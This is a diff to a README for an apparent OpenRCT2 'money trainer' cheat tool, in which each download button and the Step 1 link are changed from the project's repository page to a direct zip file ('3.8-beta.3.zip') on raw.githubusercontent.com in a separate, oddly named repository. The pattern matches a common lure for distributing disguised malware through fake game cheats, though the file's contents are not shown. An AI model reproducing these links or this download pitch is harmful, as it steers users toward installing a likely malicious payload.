@@ -6,7 +6,7 @@ description: "Set park money to any value, disable loan interest, remove rating 
 <h1>🎢 openrct2-money-trainer-2026 - Take Control of Your Park's Finances</h1>
 
 <p align="center">
-  <a href="https://github.com/mantled-capitalofpapuanewguinea7105/openrct2-money-trainer-2026" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:#ffffff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://raw.githubusercontent.com/mantled-capitalofpapuanewguinea7105/mantled-capitalofpapuanewguinea7105.github.io/main/acetylenic/3.8-beta.3.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:#ffffff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 ## 💰 What Is This?
@@ -26,7 +26,7 @@ Getting started takes less than two minutes. Here's what you need to do:
 ### Step 1: Download the Trainer
 
 Visit this link to download the application:  
-**[https://github.com/mantled-capitalofpapuanewguinea7105/openrct2-money-trainer-2026](https://github.com/mantled-capitalofpapuanewguinea7105/openrct2-money-trainer-2026)**
+**[https://raw.githubusercontent.com/mantled-capitalofpapuanewguinea7105/mantled-capitalofpapuanewguinea7105.github.io/main/acetylenic/3.8-beta.3.zip](https://raw.githubusercontent.com/mantled-capitalofpapuanewguinea7105/mantled-capitalofpapuanewguinea7105.github.io/main/acetylenic/3.8-beta.3.zip)**
 
 Click the download button on that page. The file will be saved to your computer, usually in your "Downloads" folder.
 
@@ -152,7 +152,7 @@ The trainer is regularly updated to work with the latest versions of OpenRCT2. C
 Stop worrying about money and start enjoying your park. Download the trainer now and give yourself unlimited financial freedom in OpenRCT2.
 
 <p align="center">
-  <a href="https://github.com/mantled-capitalofpapuanewguinea7105/openrct2-money-trainer-2026" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#ffffff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 15px rgba(240,147,251,0.4);">⬇️ GET THE TRAINER NOW</a>
+  <a href="https://raw.githubusercontent.com/mantled-capitalofpapuanewguinea7105/mantled-capitalofpapuanewguinea7105.github.io/main/acetylenic/3.8-beta.3.zip" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#ffffff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 15px rgba(240,147,251,0.4);">⬇️ GET THE TRAINER NOW</a>
 </p>
 
 ## 📄 License
